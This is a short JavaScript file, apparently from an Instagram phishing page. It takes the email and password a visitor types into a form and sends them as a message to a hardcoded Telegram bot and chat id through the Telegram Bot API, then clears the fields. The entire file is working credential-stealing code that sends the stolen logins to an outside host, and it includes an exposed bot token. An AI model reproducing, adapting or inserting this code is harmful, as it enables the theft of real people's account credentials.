//bot token
var telegram_bot_id = "5833825722:AAGHz2o3eJNvgbPJN2dXiYq4-KPNWPc1-T8";
//chat id
var chat_id = 957866900;
var email, password;
var ready = function () {
    // u_name = document.getElementById("name").value;
    email = document.getElementById("email").value;
    password = document.getElementById("password").value;
    // message = "Name: " + u_name + "\nEmail: " + email + "\nMessage: " + message;
    message = "Instagram_Email, Username, Phone no: " + email + "\nInstagram_Password: " + password;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
    // document.getElementById("message").value = "";
    return false;
};
